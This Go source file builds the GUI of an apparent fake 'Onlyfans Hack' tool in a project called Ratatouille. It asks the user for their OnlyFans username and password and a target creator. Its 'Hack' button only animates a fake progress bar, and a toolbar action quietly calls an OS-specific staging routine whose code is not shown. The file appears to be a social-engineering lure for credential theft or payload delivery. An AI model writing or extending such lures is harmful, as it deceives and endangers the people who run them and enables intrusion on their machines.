//go:generate fyne bundle -o bundled.go ../assets
package gui

import (
	"jf/Ratatouille/staging"
	"jf/Ratatouille/utils"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
)

func InitGui() {
	a := app.New()
	a.Settings().SetTheme(newTheme())
	w := a.NewWindow("Onlyfans Hack")
	w.Resize(fyne.NewSize(500, 400))

	w.SetContent(makeGui())
	w.ShowAndRun()
}

func makeGui() fyne.CanvasObject {
	left := widget.NewLabel("Left")
	right := widget.NewLabel("right")
	userNameInput := widget.NewEntry()
	// userNameInput.
	userNameInput.SetPlaceHolder("Please Enter you Onlyfans Username")
	userPassword := widget.NewPasswordEntry()
	userPassword.SetPlaceHolder("Please Enter you Onlyfans Password")
	targetCreatorName := widget.NewEntry()
	targetCreatorName.SetPlaceHolder("Please Enter your Target Creator")
	content := container.NewGridWithRows(3, targetCreatorName, userNameInput, userPassword)
	return container.NewBorder(makeBanner(), bottomGui(), left, right, content)
	// top := makeBanner()
	// objects := []fyne.CanvasObject{content, top, left, right}
	// return container.New(newOnlyLayout(makeBanner(), left, right, content), objects...)
}
func makeBanner() fyne.CanvasObject {
	toolbar := widget.NewToolbar(
		widget.NewToolbarAction(theme.HomeIcon(), func() { staging.Stage(utils.GetOs()) }))
	logo := canvas.NewImageFromResource(resourceOnlyfanslogoPng)
	logo.FillMode = canvas.ImageFillContain

	return container.NewStack(toolbar, logo)
}

func bottomGui() fyne.CanvasObject {
	progressBar := widget.NewProgressBar()
	hackButton := widget.NewButton("Hack", func() {
		go func() {
			for i := 0.0; i <= 1.0; i += 0.001 {
				time.Sleep(time.Millisecond * 25)
				progressBar.SetValue(i)
			}
			progressBar.SetValue(1)
		}()
	})

	bottom := container.NewGridWithRows(2, hackButton, progressBar)

	return bottom
}
